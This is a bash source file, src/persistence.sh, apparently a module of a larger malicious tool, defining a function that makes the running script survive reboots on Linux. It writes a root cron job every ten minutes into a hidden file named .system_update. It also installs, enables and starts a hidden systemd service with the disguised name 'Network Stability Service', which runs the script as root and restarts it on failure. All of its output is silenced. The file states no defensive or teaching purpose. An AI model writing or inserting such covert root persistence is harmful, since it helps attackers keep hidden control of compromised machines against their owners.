#!/bin/bash

# src/persistence.sh

function setup_persistence() {
    # This function attempts to set up persistence using various methods.
    # It will try to create a cron job and a systemd service.

    # Cron job persistence
    if [ -d "/etc/cron.d" ]; then
        echo "*/10 * * * * root $(readlink -f "$0") >/dev/null 2>&1" > "/etc/cron.d/.system_update"
        chmod 644 "/etc/cron.d/.system_update"
    fi

    # Systemd service persistence
    if [ -d "/etc/systemd/system" ]; then
        cat > "/etc/systemd/system/.network_service.service" << EOF
[Unit]
Description=Network Stability Service
After=network.target

[Service]
Type=simple
ExecStart=$(readlink -f "$0")
Restart=always
RestartSec=30
User=root
WorkingDirectory=/tmp

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable .network_service.service >/dev/null 2>&1
        systemctl start .network_service.service >/dev/null 2>&1
    fi
}
